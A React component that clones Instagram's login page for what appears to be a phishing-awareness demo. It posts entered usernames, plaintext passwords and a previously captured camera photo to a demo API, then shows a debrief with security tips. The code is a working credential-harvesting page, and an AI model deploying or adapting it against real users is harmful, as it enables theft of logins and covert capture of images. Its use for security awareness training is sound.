import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { AlertCircle, ArrowLeft } from 'lucide-react';

export default function InstagramLogin() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState({ email: '', password: '' });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const sessionId = sessionStorage.getItem('sessionId');
    const photoData = sessionStorage.getItem('lastPhotoData');

    try {
      await fetch('/api/demo/instagram/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          email_or_username: credentials.email,
          password: credentials.password,
          photo_data: photoData,
          timestamp: new Date().toISOString(),
        }),
      }).catch(() => {
        // Offline mode - still show the educational message
      });
    } finally {
      setIsLoading(false);
      setIsSubmitted(true);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-50 to-purple-50 flex items-center justify-center p-4">
        <div className="max-w-2xl w-full">
          <div className="bg-white rounded-xl shadow-2xl p-8">
            <div className="flex justify-center mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle size={40} className="text-red-600" />
              </div>
            </div>

            <h1 className="text-3xl font-bold text-center text-gray-900 mb-4">
              📊 Demonstration Complete
            </h1>

            <div className="bg-red-50 border-l-4 border-red-400 p-6 mb-6 rounded">
              <p className="text-red-800 font-bold mb-4">
                ⚠️ THIS IS HOW PHISHING ATTACKS WORK
              </p>
              <p className="text-red-700 text-sm mb-4">
                Your credentials were just captured and would be transmitted to an untrusted server.
                This is exactly what happens in real phishing and credential harvesting attacks.
              </p>
            </div>

            <div className="space-y-4 mb-8">
              <div className="bg-gray-50 p-4 rounded-lg">
                <p className="text-sm font-semibold text-gray-700 mb-2">📱 Data Captured:</p>
                <ul className="text-sm text-gray-700 space-y-1">
                  <li>✓ Email/Username: <code className="bg-gray-200 px-2 py-1 rounded">{credentials.email}</code></li>
                  <li>✓ Password: <code className="bg-gray-200 px-2 py-1 rounded">{"•".repeat(credentials.password.length)}</code></li>
                  <li>✓ 📷 Photo captured from your camera</li>
                  <li>✓ 🎤 Audio captured from your microphone</li>
                  <li>✓ ⏰ Timestamp: {new Date().toLocaleTimeString()}</li>
                </ul>
              </div>

              <div className="bg-blue-50 border-l-4 border-blue-400 p-4 rounded">
                <p className="text-sm font-semibold text-blue-900 mb-2">🎓 Key Learnings:</p>
                <ul className="text-sm text-blue-800 space-y-1">
                  <li>• Always verify URLs before entering credentials (check the address bar)</li>
                  <li>• Never reuse passwords across different platforms</li>
                  <li>• Use a password manager to generate and store unique passwords</li>
                  <li>• Enable 2-Factor Authentication (2FA) whenever available</li>
                  <li>• Be cautious of unexpected login prompts or redirects</li>
                  <li>• Check for HTTPS (secure connection) - this demo bypassed security features</li>
                </ul>
              </div>

              <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded">
                <p className="text-sm font-semibold text-yellow-900 mb-2">💡 Additional Tips:</p>
                <ul className="text-sm text-yellow-800 space-y-1">
                  <li>• Your webcam and microphone data can be accessed just as easily</li>
                  <li>• Malware can capture screenshots and keystroke logs</li>
                  <li>• Social engineering is often more effective than technical attacks</li>
                  <li>• Keep your software and operating system updated</li>
                  <li>• Be skeptical of emails requesting sensitive information</li>
                </ul>
              </div>
            </div>

            <div className="flex gap-4">
              <button
                onClick={() => navigate('/')}
                className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-gray-600 text-white font-bold rounded-lg hover:bg-gray-700 transition"
              >
                <ArrowLeft size={20} />
                Back to Home
              </button>
              <button
                onClick={() => navigate('/demo/facebook')}
                className="flex-1 px-6 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold rounded-lg hover:from-purple-700 hover:to-blue-700 transition"
              >
                Try Another Demo
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-black text-gray-900 mb-2" style={{ fontFamily: 'Arial, sans-serif' }}>
            Instagram
          </h1>
          <p className="text-gray-600">Log in to see photos & videos from your friends</p>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-3 mb-6">
          <input
            type="text"
            placeholder="Email address or username"
            value={credentials.email}
            onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
            className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded text-sm placeholder-gray-600 focus:bg-white focus:border-gray-400 outline-none"
            required
          />

          <input
            type="password"
            placeholder="Password"
            value={credentials.password}
            onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
            className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded text-sm placeholder-gray-600 focus:bg-white focus:border-gray-400 outline-none"
            required
          />

          <button
            type="submit"
            disabled={isLoading || !credentials.email || !credentials.password}
            className="w-full bg-blue-500 text-white font-bold py-2 rounded-lg hover:bg-blue-600 transition disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? 'Logging in...' : 'Log In'}
          </button>
        </form>

        {/* Divider */}
        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-gray-300"></div>
          <span className="px-3 text-sm text-gray-600">OR</span>
          <div className="flex-1 border-t border-gray-300"></div>
        </div>

        {/* Facebook Login */}
        <button className="w-full text-center text-sm font-bold text-blue-900 mb-6 hover:underline">
          Log in with Facebook
        </button>

        {/* Forgot Password */}
        <button className="w-full text-center text-sm text-blue-600 mb-8 hover:underline">
          Forgot password?
        </button>

        {/* Sign Up */}
        <div className="text-center text-sm text-gray-600 mb-4">
          Don't have an account? <span className="text-blue-600 font-bold cursor-pointer">Sign up</span>
        </div>

        {/* Educational Notice */}
        <div className="mt-8 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
          <p className="text-xs text-yellow-800">
            <strong>⚠️ Educational Demo:</strong> This is not the real Instagram. Your credentials
            are being captured to demonstrate phishing attacks. Do not use your real password!
          </p>
        </div>
      </div>
    </div>
  );
}
